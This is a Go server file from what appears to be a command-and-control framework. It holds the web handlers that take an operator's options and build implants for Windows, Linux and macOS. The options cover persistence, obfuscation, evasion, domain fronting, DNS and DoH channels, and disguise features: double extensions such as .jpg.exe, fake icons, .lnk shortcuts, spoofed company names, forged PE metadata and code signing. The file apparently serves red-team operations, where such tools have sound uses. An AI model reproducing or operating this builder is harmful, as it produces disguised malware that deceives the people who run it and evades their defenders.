package server

import (
	"crypto/sha256"
	"encoding/base64"
	"encoding/hex"
	"fmt"
	"log/slog"
	"net/http"
	"os"
	"strings"
	"time"

	"github.com/forgec2/forgec2/internal/payload"
	"github.com/forgec2/forgec2/internal/util"
	"github.com/gin-gonic/gin"
	"golang.org/x/crypto/ssh"
)

// profileAuditHash fingerprints the effective malleable shape for build audit.
func profileAuditHash(cfg payload.ImplantConfig) string {
	h := sha256.New()
	fmt.Fprintf(h, "%s|%s|%s|%s|%s|%s|%s|%s",
		cfg.BeaconURI, cfg.Method, cfg.UserAgent,
		cfg.MalleablePrepend, cfg.MalleableAppend,
		cfg.MalleableServerOutput, cfg.MalleableClientMetadata, cfg.MalleableClientID)
	sum := h.Sum(nil)
	return hex.EncodeToString(sum)[:12]
}

type binaryGenForm struct {
	C2URL           string `form:"c2_url"`
	Protocol        string `form:"protocol"`
	BeaconTransport string `form:"beacon_transport"`
	Interval        int    `form:"interval"`
	Jitter          int    `form:"jitter"`
	BeaconTime      int    `form:"beacon_time"`
	UserAgent       string `form:"user_agent"`
	Persist         bool   `form:"persist"`
	SkipTLSVerify   bool   `form:"skip_tls_verify"`
	Filename        string `form:"filename"`
	Profile         string `form:"profile"`
	ListenerID      uint   `form:"listener_id"`
	P2PMode         string `form:"p2p_mode"`
	P2PParent       string `form:"p2p_parent"`
	P2PListenAddr   string `form:"p2p_listen_addr"`
	DNSDomain       string `form:"dns_domain"`
	DNSServer       string `form:"dns_server"`
	DNSDoHURL       string `form:"dns_doh_url"`
	DNSDoTAddr      string `form:"dns_dot_addr"`
	Proxy           string `form:"proxy"`
	CryptoKey       string `form:"crypto_key"`
	BeaconKey       string `form:"beacon_key"` // pre-shared key; empty = server's configured beacon_key
	Architecture    string `form:"architecture"`
	DomainFront     string `form:"domain_front"`
	Obfuscate       string `form:"obfuscate"`
	Evasion         string `form:"evasion"`
	GhostMode       string `form:"ghost_mode"`
	WorkingStart    string `form:"working_start"`
	WorkingEnd      string `form:"working_end"`
	WorkingTZ       string `form:"working_tz"`
	SSHUser         string `form:"ssh_user"`
	SSHPassword     string `form:"ssh_password"`
	SSHKey          string `form:"ssh_key"`
	SSHHostKey      string `form:"ssh_host_key"` // base64 server host public key pin
	// mintTenant is not form-bound: parseBinaryForm stamps the building
	// operator's tenant so the minted registration secret (and thus the
	// implant's first-registration tenant) follows the builder, not the
	// bootstrap default.
	mintTenant       uint
	MTLSCert         string `form:"mtls_cert"` // PEM client certificate (optional)
	MTLSKey          string `form:"mtls_key"`  // PEM client private key (required with mtls_cert)
	MTLSCA           string `form:"mtls_ca"`   // PEM CA bundle to pin the server in mTLS mode (optional)
	PinnedCertSHA256 string `form:"pinned_cert_sha256"`
	ExpiryDate       string `form:"expiry_date"`              // "YYYY-MM-DD"; implant auto-exits after this date
	SelfCheck        bool   `form:"self_check"`               // embed + verify a SHA-256 self-integrity hash
	NetCfgOverWire   bool   `form:"network_config_over_wire"` // bootstrap-only compile; server delivers full config at registration
	// Max random bytes appended to the HTTP/WS beacon body (0=disabled).
	ContentLengthJitter int    `form:"content_length_jitter"`
	IconB64             string `form:"icon_b64"`
	IconPreset          string `form:"icon_preset"`
	FileDescription     string `form:"file_description"`
	CompanyName         string `form:"company_name"`
	DisguiseAs          string `form:"disguise_as"`
	LNKDisguise         string `form:"lnk_disguise"` // "true" to generate .lnk alongside
	PETimestampMode     string `form:"pe_timestamp"`
	PESectionMode       string `form:"pe_sections"`
	PEImportMode        string `form:"pe_imports"`
	PEManifestMode      string `form:"pe_manifest"`
	Slim                string `form:"slim"`        // "true" for the light profile (grpc/quic/wss compiled out, ~30% smaller)
	Modules             string `form:"modules"`     // comma-separated included agent modules; empty = all (see payload/agent_modules.go)
	UPX                 string `form:"upx"`         // "true" for post-build UPX --lzma (exe/elf; missing binary = skip)
	Win7Compat          string `form:"win7_compat"` // "true" for Win7/2008R2 (go1.20.14 toolchain, forces slim, forbids garble)
	// Authenticode signing. PFX bytes are decoded from base64 in
	// parseBinaryForm and kept only for the lifetime of this request; the
	// password is never logged or audited.
	SignMode        string `form:"sign_mode"` // "", "self", "pfx", "pem"
	SignOrg         string `form:"sign_org"`
	SignPFXBase64   string `form:"sign_pfx_b64"`
	SignPFXPassword string `form:"sign_pfx_password"`
	SignCertPEM     string `form:"sign_cert_pem"`
	SignKeyPEM      string `form:"sign_key_pem"`
	SignPFX         []byte `form:"-"`
	// OriginalFilename is the operator-visible name before the uniqueness
	// prefix is added; it is embedded in VersionInfo.
	OriginalFilename string `form:"-"`
}

// parseBinaryForm validates a binary generation request and returns the resolved form.
// Returns (form, error) — on error the response has already been written.
func (s *Server) parseBinaryForm(c *gin.Context) (*binaryGenForm, bool) {
	var form binaryGenForm
	if err := c.ShouldBind(&form); err != nil {
		respondError(c, http.StatusBadRequest, "Invalid request parameters")
		return nil, false
	}
	// The minting operator's tenant travels with the build so the v3
	// registration secret names the building team (see createRegSecret).
	form.mintTenant = s.currentTenantID(c)
	// Handle icon file upload (multipart "icon" field) — overrides icon_b64 if present
	if fh, err := c.FormFile("icon"); err == nil && fh != nil {
		if fh.Size > 256*1024 {
			respondError(c, http.StatusBadRequest, "icon file too large (max 256KB)")
			return nil, false
		}
		f, err := fh.Open()
		if err == nil {
			defer f.Close()
			buf := make([]byte, 256*1024+1)
			n, _ := f.Read(buf)
			if n > 256*1024 {
				respondError(c, http.StatusBadRequest, "icon file too large (max 256KB)")
				return nil, false
			}
			data := buf[:n]
			// Validate ICO/PNG magic before accepting
			if len(data) >= 4 && !(data[0] == 0 && data[1] == 0 && data[2] == 1 && data[3] == 0) && !(data[0] == 0x89 && data[1] == 0x50 && data[2] == 0x4E && data[3] == 0x47) {
				respondError(c, http.StatusBadRequest, "icon must be .ico (00 00 01 00) or .png")
				return nil, false
			}
			form.IconB64 = base64.StdEncoding.EncodeToString(data)
		}
	}

	// mTLS client credentials (optional). Trim surrounding whitespace — a PEM
	// pasted from a file carries a trailing newline — then reject material
	// that could never complete a handshake before any build work starts.
	form.MTLSCert = strings.TrimSpace(form.MTLSCert)
	form.MTLSKey = strings.TrimSpace(form.MTLSKey)
	form.MTLSCA = strings.TrimSpace(form.MTLSCA)
	if err := payload.ValidateMTLSMaterial(form.MTLSCert, form.MTLSKey, form.MTLSCA); err != nil {
		respondError(c, http.StatusBadRequest, err.Error())
		return nil, false
	}

	isP2P := form.P2PMode == "parent" || form.P2PMode == "child"
	isDNS := form.DNSDomain != "" || form.DNSServer != ""

	if !isP2P && !isDNS && form.ListenerID == 0 {
		respondError(c, http.StatusBadRequest, "listener or DNS domain is required")
		return nil, false
	}

	if !isP2P && !isDNS {
		resolved, err := s.resolveListener(form.ListenerID)
		if err != nil {
			respondError(c, http.StatusBadRequest, "Invalid listener configuration")
			return nil, false
		}
		merged, err := mergeC2URLList(resolved.C2URL, form.C2URL)
		if err != nil {
			respondError(c, http.StatusBadRequest, "Invalid C2 or failover URL: "+err.Error())
			return nil, false
		}
		form.C2URL = merged
		form.Protocol = resolved.Protocol
		if form.BeaconTransport == "" {
			form.BeaconTransport = resolved.BeaconTransport
		}
		if resolved.DNSDomain != "" {
			form.DNSDomain = resolved.DNSDomain
			if form.DNSServer == "" {
				form.DNSServer = resolved.DNSServer
			}
		}
	} else {
		merged, err := mergeC2URLList("", form.C2URL)
		if err != nil {
			respondError(c, http.StatusBadRequest, "Invalid C2 or failover URL: "+err.Error())
			return nil, false
		}
		form.C2URL = merged
		if isDNS && form.Protocol == "" {
			form.Protocol = "dns"
			if form.BeaconTransport == "" {
				form.BeaconTransport = "dns"
			}
		}
	}
	if form.BeaconTransport == "" {
		form.BeaconTransport = form.Protocol
	}
	if form.BeaconTransport == "" {
		form.BeaconTransport = "http"
	}

	if form.ExpiryDate != "" {
		if _, err := time.Parse("2006-01-02", form.ExpiryDate); err != nil {
			respondError(c, http.StatusBadRequest, "expiry_date must be in YYYY-MM-DD format")
			return nil, false
		}
	}

	// Disguise filename via shared payload helper (single source of truth).
	if form.Filename != "" {
		form.Filename = payload.ApplyDisguiseFilename(form.Filename, form.DisguiseAs)
	}
	// Validate icon payload (≤350KB base64 ≈ 256KB raw)
	if form.IconB64 != "" {
		if len(form.IconB64) > 350*1024 {
			respondError(c, http.StatusBadRequest, "icon too large (max 256KB raw, ~350KB base64)")
			return nil, false
		}
		if _, err := base64.StdEncoding.DecodeString(form.IconB64); err != nil {
			respondError(c, http.StatusBadRequest, "icon is not valid base64")
			return nil, false
		}
	}
	// Restrict disguise_as via shared payload helper (canonical keys + aliases).
	if form.DisguiseAs != "" {
		if !payload.AllowedDisguise(form.DisguiseAs) {
			form.DisguiseAs = ""
		} else {
			form.DisguiseAs = payload.NormalizeDisguise(form.DisguiseAs)
		}
	}
	// Normalize PE options
	form.PETimestampMode = strings.ToLower(strings.TrimSpace(form.PETimestampMode))
	if form.PETimestampMode != "random" && form.PETimestampMode != "keep" {
		form.PETimestampMode = "zero"
	}
	form.PESectionMode = strings.ToLower(strings.TrimSpace(form.PESectionMode))
	if form.PESectionMode != "random" {
		form.PESectionMode = "default"
	}
	form.PEImportMode = strings.ToLower(strings.TrimSpace(form.PEImportMode))
	if form.PEImportMode != "kernel32+user32" && form.PEImportMode != "kernel32" {
		form.PEImportMode = "none"
	}
	form.PEManifestMode = strings.ToLower(strings.TrimSpace(form.PEManifestMode))
	if form.PEManifestMode != "blend" {
		form.PEManifestMode = "default"
	}

	// Authenticode signing options. PFX bytes are decoded with a hard cap and
	// held only for this request; the password is never logged or audited.
	// Material validity (password, EKU, expiry, key size) is checked in
	// validateBinaryBuild so a bad PFX answers 422 before a job or one-shot
	// registration secret is created.
	form.SignMode = strings.ToLower(strings.TrimSpace(form.SignMode))
	if form.SignMode == "none" {
		form.SignMode = ""
	}
	switch form.SignMode {
	case "", "self", "pfx", "pem":
	default:
		respondError(c, http.StatusUnprocessableEntity, "sign_mode must be self, pfx or pem")
		return nil, false
	}
	form.SignOrg = strings.TrimSpace(form.SignOrg)
	form.SignPFXBase64 = strings.TrimSpace(form.SignPFXBase64)
	if form.SignPFXBase64 != "" {
		if len(form.SignPFXBase64) > 96*1024 {
			respondError(c, http.StatusUnprocessableEntity, "sign_pfx_b64 is too large (max 64KB PFX)")
			return nil, false
		}
		raw, err := base64.StdEncoding.DecodeString(form.SignPFXBase64)
		if err != nil {
			respondError(c, http.StatusUnprocessableEntity, "sign_pfx_b64 is not valid base64")
			return nil, false
		}
		if len(raw) > 64*1024 {
			respondError(c, http.StatusUnprocessableEntity, "PFX exceeds 64KB")
			return nil, false
		}
		form.SignPFX = raw
	}
	if form.SignMode == "pfx" && len(form.SignPFX) == 0 {
		respondError(c, http.StatusUnprocessableEntity, "sign_mode=pfx requires sign_pfx_b64")
		return nil, false
	}
	if form.SignMode != "pfx" && len(form.SignPFX) > 0 {
		respondError(c, http.StatusUnprocessableEntity, "sign_pfx_b64 requires sign_mode=pfx")
		return nil, false
	}
	if form.SignMode == "pem" && (strings.TrimSpace(form.SignCertPEM) == "" || strings.TrimSpace(form.SignKeyPEM) == "") {
		respondError(c, http.StatusUnprocessableEntity, "sign_mode=pem requires sign_cert_pem and sign_key_pem")
		return nil, false
	}
	// Agent module selection: comma-separated catalogue names, empty = every
	// module. Validated at the API boundary so a typo answers 400 instead of
	// surfacing as a build error (or, worse, silently narrowing the payload).
	if _, err := payload.NormalizeAgentModules(parseModuleSelection(form.Modules), false); err != nil {
		respondError(c, http.StatusBadRequest, err.Error())
		return nil, false
	}

	// Prefix filename with short UUID to prevent concurrent build collisions.
	// Sanitize first to block path traversal and header-injection characters.
	if form.Filename != "" {
		// Preserve double extension for disguise (e.g. .jpg.exe) — sanitize each part
		disguiseExtWant := payload.DisguiseExtFor(form.DisguiseAs)
		origDisguise := disguiseExtWant != "" && strings.Contains(strings.ToLower(form.Filename), disguiseExtWant+".exe")
		form.Filename = sanitizeFilename(form.Filename)
		// sanitizeFilename replaces '.'-prefixed leading dots and may mangle double ext;
		// re-apply disguise suffix if it was stripped
		if origDisguise && !strings.Contains(strings.ToLower(form.Filename), disguiseExtWant) {
			form.Filename = payload.ApplyDisguiseFilename(form.Filename, form.DisguiseAs)
		}
		// Keep the operator-visible name for VersionInfo/OriginalFilename
		// before adding the server's uniqueness prefix.
		form.OriginalFilename = form.Filename
		shortID := strings.Replace(util.NewString()[:8], "-", "", -1)
		form.Filename = fmt.Sprintf("%s_%s", shortID, form.Filename)
	}

	return &form, true
}

// parseModuleSelection splits the `modules` form field (comma-separated agent
// module names) into a trimmed, de-duplicated list preserving first-seen
// order. Empty parts are dropped so a trailing comma cannot sketch an empty
// name; an empty result means "every module".
func parseModuleSelection(raw string) []string {
	var out []string
	seen := map[string]bool{}
	for _, part := range strings.Split(raw, ",") {
		name := strings.TrimSpace(part)
		if name == "" || seen[name] {
			continue
		}
		seen[name] = true
		out = append(out, name)
	}
	return out
}

// handleAgentModules exposes the agent module catalogue so the Generate page
// can render the module selector (and task counts) without hardcoding the
// list — the same catalogue the server validates against.
func (s *Server) handleAgentModules(c *gin.Context) {
	catalog := payload.AgentModuleCatalog()
	type moduleJSON struct {
		Name        string   `json:"name"`
		Title       string   `json:"title"`
		Description string   `json:"description"`
		Tasks       []string `json:"tasks"`
		Special     string   `json:"special,omitempty"`
	}
	out := make([]moduleJSON, 0, len(catalog))
	for _, m := range catalog {
		out = append(out, moduleJSON{Name: m.Name, Title: m.Title, Description: m.Description, Tasks: m.Tasks, Special: m.Special})
	}
	respond(c, gin.H{"modules": out})
}

// buildImplantConfig constructs an ImplantConfig from the parsed binary form.
// Returns an error if a required v3 registration secret cannot be created, so
// the caller can fail the build rather than emit an unregisterable implant.
func (s *Server) buildImplantConfig(form *binaryGenForm) (payload.ImplantConfig, error) {
	interval, jitter := clampIntervalJitter(form.Interval, form.Jitter, form.BeaconTime)
	arch := parseArchitecture(form.Architecture)

	p2pMode := ""
	p2pParent := ""
	p2pListenAddr := ""
	if form.P2PMode == "parent" {
		p2pMode = "tcp"
		if form.P2PListenAddr != "" {
			p2pListenAddr = form.P2PListenAddr
		}
	} else if form.P2PMode == "child" {
		p2pParent = form.P2PParent
		form.Protocol = "http"
	}

	hostKey := form.SSHHostKey
	if hostKey == "" && s != nil {
		hostKey = s.loadSSHHostPublicKeyB64()
	}

	beaconKey := form.BeaconKey
	if beaconKey == "" && s != nil {
		beaconKey = s.serverBeaconKey()
	}

	// Malleable response wrapping: pull the agent-symmetric cover pair so
	// generated agents embed matching strip tokens (see effectiveCoverTokens:
	// raw v2/preset bytes would brick parsing). Explicit per-build profile
	// values (if the form ever exposes them) would win via
	// NormalizeImplantConfig.
	prepend, appendBytes := "", ""
	if s != nil {
		prepend, appendBytes = s.effectiveCoverTokens()
	}

	// v3: per-implant registration secret. When no explicit per-build beacon
	// key was supplied, the build would otherwise embed the fleet master key —
	// instead generate a unique 32-byte registration secret, persist it sealed
	// server-side, and embed ONLY that secret (plus its public id) in the
	// binary. Extracting one payload then yields no other agent's keys.
	// Working-hours default: carried explicitly so NormalizeImplantConfig can
	// apply the documented precedence explicit form > profile > server
	// default. Previously the server default was parsed and saved but never
	// wired into builds.
	s.configMu.RLock()
	defWorkStart, defWorkEnd, defWorkTZ := s.cfg.Implant.DefaultWorkingStart, s.cfg.Implant.DefaultWorkingEnd, s.cfg.Implant.DefaultWorkingTZ
	dnsObscure := s.cfg != nil && s.cfg.Server.DNSObscure
	s.configMu.RUnlock()

	var err error
	var regSecretID, regSecretB64 string
	regSecretID, regSecretB64, beaconKey, err = s.ensureV3RegSecret(beaconKey, form.mintTenant)
	if err != nil {
		return payload.ImplantConfig{}, err
	}

	return payload.ImplantConfig{
		C2URL:                 form.C2URL,
		Protocol:              form.Protocol,
		BeaconTransport:       form.BeaconTransport,
		Interval:              interval,
		Jitter:                jitter,
		UserAgent:             form.UserAgent,
		Persist:               form.Persist,
		SkipTLSVerify:         form.SkipTLSVerify,
		Filename:              form.Filename,
		Debug:                 false,
		MalleablePrepend:      prepend,
		MalleableAppend:       appendBytes,
		Profile:               form.Profile,
		ListenerID:            form.ListenerID,
		P2PMode:               p2pMode,
		P2PParent:             p2pParent,
		P2PListenAddr:         p2pListenAddr,
		DNSDomain:             form.DNSDomain,
		DNSServer:             form.DNSServer,
		DNSDoHURL:             form.DNSDoHURL,
		DNSDoTAddr:            form.DNSDoTAddr,
		Proxy:                 form.Proxy,
		CryptoKey:             form.CryptoKey,
		BeaconKey:             beaconKey,
		RegSecretID:           regSecretID,
		RegSecret:             regSecretB64,
		Architecture:          arch,
		DomainFront:           form.DomainFront,
		Obfuscate:             form.Obfuscate == "true" || form.Obfuscate == "1",
		Evasion:               form.Evasion == "true" || form.Evasion == "1",
		GhostMode:             form.GhostMode == "true" || form.GhostMode == "1",
		WorkingStart:          form.WorkingStart,
		WorkingEnd:            form.WorkingEnd,
		WorkingTZ:             form.WorkingTZ,
		DefaultWorkingStart:   defWorkStart,
		DefaultWorkingEnd:     defWorkEnd,
		DefaultWorkingTZ:      defWorkTZ,
		NetworkConfigOverWire: form.NetCfgOverWire,
		SSHUser:               form.SSHUser,
		SSHPassword:           form.SSHPassword,
		SSHKey:                form.SSHKey,
		SSHHostKey:            hostKey,
		MTLSCertPEM:           form.MTLSCert,
		MTLSKeyPEM:            form.MTLSKey,
		MTLSCAPEM:             form.MTLSCA,
		PinnedCertSHA256:      form.PinnedCertSHA256,
		ExpiryDate:            form.ExpiryDate,
		SelfCheck:             form.SelfCheck,
		ContentLengthJitter:   form.ContentLengthJitter,
		DNSObscure:            dnsObscure,
		IconB64:               form.IconB64,
		IconPreset:            form.IconPreset,
		FileDescription:       form.FileDescription,
		CompanyName:           form.CompanyName,
		DisguiseAs:            form.DisguiseAs,
		LNKDisguise:           form.LNKDisguise == "true" || form.LNKDisguise == "1",
		PETimestampMode:       form.PETimestampMode,
		PESectionMode:         form.PESectionMode,
		PEImportMode:          form.PEImportMode,
		PEManifestMode:        form.PEManifestMode,
		Slim:                  form.Slim == "true" || form.Slim == "1",
		Modules:               parseModuleSelection(form.Modules),
		UPX:                   form.UPX == "true" || form.UPX == "1",
		Win7Compat:            form.Win7Compat == "true" || form.Win7Compat == "1",
		SignMode:              form.SignMode,
		SignOrg:               form.SignOrg,
		SignPFX:               form.SignPFX,
		SignPFXPassword:       form.SignPFXPassword,
		SignCertPEM:           []byte(form.SignCertPEM),
		SignKeyPEM:            []byte(form.SignKeyPEM),
		OriginalFilename:      form.OriginalFilename,
	}, nil
}

// serverBeaconKey returns the configured server beacon_key (empty = PSK auth disabled).
func (s *Server) serverBeaconKey() string {
	if s == nil || s.cfg == nil {
		return ""
	}
	s.configMu.RLock()
	defer s.configMu.RUnlock()
	return s.cfg.Server.BeaconKey
}

// handleGetBeaconKey returns the server's configured beacon_key so the Generate
// page can pre-fill the PSK field (operator-only, session-authenticated).
func (s *Server) handleGetBeaconKey(c *gin.Context) {
	respond(c, gin.H{"beacon_key": s.serverBeaconKey()})
}

// loadSSHHostPublicKeyB64 returns base64 of the SSH transport host public key for implant pinning.
func (s *Server) loadSSHHostPublicKeyB64() string {
	if s == nil || s.cfg == nil {
		return ""
	}
	s.configMu.RLock()
	path := s.cfg.Server.SSHHostKey
	s.configMu.RUnlock()
	if path == "" {
		return ""
	}
	raw, err := os.ReadFile(path)
	if err != nil || len(raw) == 0 {
		return ""
	}
	signer, err := ssh.ParsePrivateKey(raw)
	if err != nil {
		return ""
	}
	pub := signer.PublicKey()
	return base64.StdEncoding.EncodeToString(ssh.MarshalAuthorizedKey(pub))
}

// validateBinaryBuild runs request-level checks before a registration secret is
// minted or a job is queued. This keeps predictable option/architecture errors
// out of the asynchronous worker and avoids consuming a one-shot secret for a
// request that can never build.
func (s *Server) validateBinaryBuild(form *binaryGenForm, goos, format string) error {
	if err := payload.CheckGoToolchain(); err != nil {
		return err
	}
	cfg := payload.ImplantConfig{
		Architecture:    parseArchitecture(form.Architecture),
		BeaconTransport: form.BeaconTransport,
		Slim:            form.Slim == "true" || form.Slim == "1",
		Modules:         parseModuleSelection(form.Modules),
		UPX:             form.UPX == "true" || form.UPX == "1",
		Win7Compat:      form.Win7Compat == "true" || form.Win7Compat == "1",
		Obfuscate:       form.Obfuscate == "true" || form.Obfuscate == "1",
		SelfCheck:       form.SelfCheck,
		SignMode:        form.SignMode,
		SignOrg:         form.SignOrg,
		SignPFX:         form.SignPFX,
		SignPFXPassword: form.SignPFXPassword,
		SignCertPEM:     []byte(form.SignCertPEM),
		SignKeyPEM:      []byte(form.SignKeyPEM),
	}
	return payload.ValidateImplantBuild(goos, format, &cfg)
}

func (s *Server) handleGenerateEXE(c *gin.Context) {
	if !s.requireOperator(c) {
		return
	}
	form, ok := s.parseBinaryForm(c)
	if !ok {
		return
	}
	if err := s.validateBinaryBuild(form, "windows", "exe"); err != nil {
		respondError(c, http.StatusUnprocessableEntity, err.Error())
		return
	}
	cfg, err := s.buildImplantConfig(form)
	if err != nil {
		// Keep the raw error in the log: it names key material and paths, which
		// must not travel to the client even for an authenticated operator.
		slog.Error("Implant build setup failed", "err", err)
		respondError(c, http.StatusInternalServerError, sanitizeError(err, "Implant build"))
		return
	}
	agentsDir := s.extractAgentsDir()
	job := s.startBuildJobWithProfile("windows", "exe", form.C2URL, form.ListenerID, form.Filename, form.Profile, profileAuditHash(cfg), s.currentTenantID(c))

	if !s.submitBuild(job, func() (string, error) {
		return payload.GenerateWindowsEXE(cfg, agentsDir)
	}, "windows", "exe", form.C2URL, form.ListenerID, form.Filename) {
		s.abandonBuildJob(job)
		c.JSON(http.StatusTooManyRequests, gin.H{"success": false, "error": "build queue is full, retry shortly"})
		return
	}

	respond(c, gin.H{"build_id": job.ID, "status": "building"})
}

func (s *Server) handleGenerateDLL(c *gin.Context) {
	if !s.requireOperator(c) {
		return
	}
	form, ok := s.parseBinaryForm(c)
	if !ok {
		return
	}
	if err := s.validateBinaryBuild(form, "windows", "dll"); err != nil {
		respondError(c, http.StatusUnprocessableEntity, err.Error())
		return
	}
	cfg, err := s.buildImplantConfig(form)
	if err != nil {
		// Keep the raw error in the log: it names key material and paths, which
		// must not travel to the client even for an authenticated operator.
		slog.Error("Implant build setup failed", "err", err)
		respondError(c, http.StatusInternalServerError, sanitizeError(err, "Implant build"))
		return
	}
	agentsDir := s.extractAgentsDir()
	// Fail fast on toolchain problems. Whether this host can cross-compile a
	// CGO DLL is a property of the machine, not of the request, and the same
	// check would otherwise run inside the queued job after sources had been
	// extracted — surfacing as a build that hangs and then fails.
	if err := payload.CheckDLLBuildPreconditions(cfg.Architecture, cfg.Obfuscate); err != nil {
		respondError(c, http.StatusUnprocessableEntity, err.Error())
		return
	}
	job := s.startBuildJobWithProfile("windows", "dll", form.C2URL, form.ListenerID, form.Filename, form.Profile, profileAuditHash(cfg), s.currentTenantID(c))

	if !s.submitBuild(job, func() (string, error) {
		return payload.GenerateWindowsDLL(cfg, agentsDir)
	}, "windows", "dll", form.C2URL, form.ListenerID, form.Filename) {
		s.abandonBuildJob(job)
		c.JSON(http.StatusTooManyRequests, gin.H{"success": false, "error": "build queue is full, retry shortly"})
		return
	}

	respond(c, gin.H{"build_id": job.ID, "status": "building"})
}

func (s *Server) handleGenerateLinux(c *gin.Context) {
	if !s.requireOperator(c) {
		return
	}
	form, ok := s.parseBinaryForm(c)
	if !ok {
		return
	}
	if err := s.validateBinaryBuild(form, "linux", "elf"); err != nil {
		respondError(c, http.StatusUnprocessableEntity, err.Error())
		return
	}
	cfg, err := s.buildImplantConfig(form)
	if err != nil {
		// Keep the raw error in the log: it names key material and paths, which
		// must not travel to the client even for an authenticated operator.
		slog.Error("Implant build setup failed", "err", err)
		respondError(c, http.StatusInternalServerError, sanitizeError(err, "Implant build"))
		return
	}
	agentsDir := s.extractAgentsDir()
	job := s.startBuildJobWithProfile("linux", "elf", form.C2URL, form.ListenerID, form.Filename, form.Profile, profileAuditHash(cfg), s.currentTenantID(c))

	if !s.submitBuild(job, func() (string, error) {
		return payload.GenerateLinuxELF(cfg, agentsDir)
	}, "linux", "elf", form.C2URL, form.ListenerID, form.Filename) {
		s.abandonBuildJob(job)
		c.JSON(http.StatusTooManyRequests, gin.H{"success": false, "error": "build queue is full, retry shortly"})
		return
	}

	respond(c, gin.H{"build_id": job.ID, "status": "building"})
}

func (s *Server) handleGenerateMacOS(c *gin.Context) {
	if !s.requireOperator(c) {
		return
	}
	form, ok := s.parseBinaryForm(c)
	if !ok {
		return
	}
	if err := s.validateBinaryBuild(form, "darwin", "macho"); err != nil {
		respondError(c, http.StatusUnprocessableEntity, err.Error())
		return
	}
	cfg, err := s.buildImplantConfig(form)
	if err != nil {
		// Keep the raw error in the log: it names key material and paths, which
		// must not travel to the client even for an authenticated operator.
		slog.Error("Implant build setup failed", "err", err)
		respondError(c, http.StatusInternalServerError, sanitizeError(err, "Implant build"))
		return
	}
	agentsDir := s.extractAgentsDir()
	job := s.startBuildJobWithProfile("macos", "binary", form.C2URL, form.ListenerID, form.Filename, form.Profile, profileAuditHash(cfg), s.currentTenantID(c))

	if !s.submitBuild(job, func() (string, error) {
		return payload.GenerateMacOS(cfg, agentsDir)
	}, "macos", "binary", form.C2URL, form.ListenerID, form.Filename) {
		s.abandonBuildJob(job)
		c.JSON(http.StatusTooManyRequests, gin.H{"success": false, "error": "build queue is full, retry shortly"})
		return
	}

	respond(c, gin.H{"build_id": job.ID, "status": "building"})
}
